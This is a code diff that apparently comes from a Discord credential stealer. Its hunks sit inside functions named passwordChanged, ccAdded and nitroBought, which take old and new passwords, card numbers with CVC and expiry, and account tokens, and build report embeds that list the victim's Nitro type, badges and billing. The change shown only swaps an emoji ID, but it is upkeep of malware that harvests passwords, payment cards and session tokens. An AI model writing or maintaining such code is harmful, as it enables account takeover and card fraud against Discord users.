@@ -707,7 +707,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           },
           {
             name: '**Discord Info**',
-            value: `<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro Type: **${nitro}**\n <a:BadgesRoll:1073745166977998959> Badges: **${badges}**\n <:Discord_CreditCard:1073745405285765160> Billing: **${billing}**`,
+            value: `<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro Type: **${nitro}**\n <a:BadgesRoll:1073745137445904434> Badges: **${badges}**\n <:Discord_CreditCard:1073745405285765160> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -824,7 +824,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Info**',
-            value: `<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro Type: **${nitro}**\n<a:BadgesRoll:1073745166977998959> Badges: **${badges}**\n<:Discord_CreditCard:1073745405285765160> Billing: **${billing}**`,
+            value: `<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro Type: **${nitro}**\n<a:BadgesRoll:1073745137445904434> Badges: **${badges}**\n<:Discord_CreditCard:1073745405285765160> Billing: **${billing}**`,
             inline: true,
           },
           {
@@ -865,7 +865,7 @@ const nitroBought = async (token) => {
           },
           {
             name: '**Discord Info**',
-            value: `<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro Type: **${nitro}**\n<a:BadgesRoll:1073745166977998959> Badges: **${badges}**\n<:Discord_CreditCard:1073745405285765160> Billing: **${billing}**`,
+            value: `<a:Evolving_badge_Nitro_a_scaling:1073743165821034577> Nitro Type: **${nitro}**\n<a:BadgesRoll:1073745137445904434> Badges: **${badges}**\n<:Discord_CreditCard:1073745405285765160> Billing: **${billing}**`,
             inline: true,
           },
           {
